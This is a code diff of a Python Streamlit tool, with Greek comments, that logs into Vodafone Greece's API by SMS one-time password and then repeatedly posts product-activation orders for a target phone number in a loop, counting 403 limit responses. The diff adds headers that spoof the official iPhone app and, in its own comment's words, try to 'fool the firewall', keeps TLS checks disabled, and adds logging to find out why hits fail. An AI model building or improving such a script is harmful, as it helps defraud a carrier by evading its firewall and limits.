@@ -12,6 +12,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 BASE_URL = "https://eu3.api.vodafone.com"
 AUTH_OTP_URL = f"{BASE_URL}/OAuth2OTPGrant/v1"
 ORDER_URL = f"{BASE_URL}/productOrderingAndValidation/v1/productOrder"
+# User Agent που μιμείται την εφαρμογή iPhone
 USER_AGENT = "My%20CU/5.8.6.2 CFNetwork/3860.300.31 Darwin/25.2.0"
 
 # --- UI CONFIG ---
@@ -36,7 +37,7 @@ def check_credentials(username, password):
         sec_pass = st.secrets["auth"]["password"]
         return username == sec_user and password == sec_pass
     except Exception:
-        st.error("❌ Λείπει το αρχείο .streamlit/secrets.toml!")
+        st.error("❌ Λείπει το αρχείο secrets στο Streamlit Cloud ή τοπικά!")
         return False
 
 def check_otp(otp_code):
@@ -46,7 +47,7 @@ def check_otp(otp_code):
         totp = pyotp.TOTP(sec_key)
         return totp.verify(otp_code)
     except Exception:
-        st.error("❌ Πρόβλημα με το secret key στο secrets.toml")
+        st.error("❌ Πρόβλημα με το secret key στα secrets.")
         return False
 
 def send_vodafone_sms(phone):
@@ -59,9 +60,10 @@ def send_vodafone_sms(phone):
     }
     data = {"login_hint": f"+30{phone}", "response_type": "code"}
     try:
-        res = requests.post(f"{AUTH_OTP_URL}/authorize", headers=headers, data=data, verify=False)
+        res = requests.post(f"{AUTH_OTP_URL}/authorize", headers=headers, data=data, verify=False, timeout=10)
         return res.status_code in [200, 202]
-    except:
+    except Exception as e:
+        st.error(f"SMS Error: {e}")
         return False
 
 def verify_vodafone_otp(phone, otp):
@@ -77,32 +79,43 @@ def verify_vodafone_otp(phone, otp):
     encoded_auth = base64.b64encode(raw_auth.encode()).decode()
     data = {"grant_type": "urn:vodafone:params:oauth:grant-type:otp", "code": encoded_auth}
     try:
-        res = requests.post(f"{AUTH_OTP_URL}/token", headers=headers, data=data, verify=False)
+        res = requests.post(f"{AUTH_OTP_URL}/token", headers=headers, data=data, verify=False, timeout=10)
         if res.status_code == 200:
             return res.json().get("access_token")
         return None
-    except:
+    except Exception:
         return None
 
 def activate_package(token, target_msisdn, offering_id):
+    """
+    Ενεργοποιεί πακέτο.
+    Επιστρέφει: (status_code, response_text) για debugging.
+    """
     headers = {
         "Content-Type": "application/json",
         "User-Agent": USER_AGENT,
         "Authorization": f"Bearer {token}",
         "api-key-name": "CUAPP",             
-        "vf-country-code": "GR"
+        "vf-country-code": "GR",
+        # Προσθήκη έξτρα headers μήπως ξεγελάσουμε το firewall
+        "Origin": "https://www.vodafonecu.gr",
+        "Referer": "https://www.vodafonecu.gr/"
     }
+    
     payload = {
         "productOrderItem": [{
-            "action": "adhoc", "quantity": 1, "productOffering": {"id": offering_id}
+            "action": "adhoc", 
+            "quantity": 1, 
+            "productOffering": {"id": offering_id}
         }],
         "relatedParty": [{"role": "subscriber", "id": target_msisdn}]
     }
+    
     try:
-        response = requests.post(ORDER_URL, headers=headers, json=payload, verify=False)
-        return response.status_code
+        response = requests.post(ORDER_URL, headers=headers, json=payload, verify=False, timeout=15)
+        return response.status_code, response.text
     except Exception as e:
-        return str(e)
+        return 0, str(e)
 
 # --- LOGIN FLOW ---
 
@@ -132,7 +145,7 @@ if st.session_state['login_step'] < 3:
             with col1:
                 submit_otp = st.form_submit_button("Είσοδος")
             with col2:
-                back_btn = st.form_submit_button("🔙 Πίσω") # Κουμπί για επιστροφή
+                back_btn = st.form_submit_button("🔙 Πίσω")
 
             if back_btn:
                 st.session_state['login_step'] = 1
@@ -165,22 +178,24 @@ else:
             phone_input = st.text_input("Αριθμός Κινητού (χωρίς +30)", value=st.session_state.get('vf_phone', '') or '')
         
         if st.button("📨 Αποστολή SMS") and phone_input:
-            if send_vodafone_sms(phone_input):
-                st.session_state['sms_sent'] = True
-                st.session_state['vf_phone'] = phone_input
-                st.success(f"SMS στο {phone_input}")
-            else:
-                st.error("Error sending SMS.")
+            with st.spinner("Αποστολή..."):
+                if send_vodafone_sms(phone_input):
+                    st.session_state['sms_sent'] = True
+                    st.session_state['vf_phone'] = phone_input
+                    st.success(f"SMS στο {phone_input}")
+                else:
+                    st.error("Error sending SMS. Δες τα logs.")
 
         if st.session_state['sms_sent']:
             otp_input = st.text_input("Κωδικός OTP (από SMS)")
             if st.button("✅ Επαλήθευση"):
-                token = verify_vodafone_otp(st.session_state['vf_phone'], otp_input)
-                if token:
-                    st.session_state['vf_token'] = token
-                    st.rerun()
-                else:
-                    st.error("Login Failed.")
+                with st.spinner("Έλεγχος..."):
+                    token = verify_vodafone_otp(st.session_state['vf_phone'], otp_input)
+                    if token:
+                        st.session_state['vf_token'] = token
+                        st.rerun()
+                    else:
+                        st.error("Login Failed. Λάθος OTP ή Timeout.")
 
     # --- Tool Control Panel ---
     else:
@@ -200,18 +215,42 @@ else:
         if st.button("🔥 ΕΝΑΡΞΗ"):
             progress_bar = st.progress(0)
             status_text = st.empty()
-            success_count, fail_count, limit_count = 0, 0, 0
+            
+            # Debug Log Area - Εδώ θα δούμε τι φταίει
+            st.subheader("📜 Debug Logs")
+            log_area = st.container()
+            
+            success_count = 0
+            fail_count = 0
+            limit_count = 0
             
             for i in range(loops):
                 status_text.text(f"Ενέργεια {i+1}/{loops}...")
-                code = activate_package(st.session_state['vf_token'], target_phone, offering_id)
                 
-                if code in [200, 201]: success_count += 1
-                elif code == 403: limit_count += 1
-                else: fail_count += 1
+                # Κλήση της συνάρτησης που επιστρέφει ΚΑΙ το μήνυμα σφάλματος
+                code, msg = activate_package(st.session_state['vf_token'], target_phone, offering_id)
+                
+                if code in [200, 201]:
+                    success_count += 1
+                    with log_area:
+                        st.success(f"Hit #{i+1}: Success")
+                elif code == 403:
+                    limit_count += 1
+                    with log_area:
+                        st.warning(f"Hit #{i+1}: Limit Reached (403)")
+                else:
+                    fail_count += 1
+                    with log_area:
+                        # Εμφανίζει τον κωδικό και το μήνυμα από τη Vodafone
+                        st.error(f"Hit #{i+1}: Failed ({code}) -> {msg}")
                 
                 progress_bar.progress((i + 1) / loops)
-                time.sleep(0.2)
+                time.sleep(0.5)
             
             status_text.text("Τέλος!")
-            st.write(f"✅: {success_count} | ⚠️: {limit_count} | ❌: {fail_count}")
+            
+            st.write("---")
+            col1, col2, col3 = st.columns(3)
+            col1.metric("✅ Επιτυχίες", success_count)
+            col2.metric("⚠️ Limits", limit_count)
+            col3.metric("❌ Σφάλματα", fail_count)
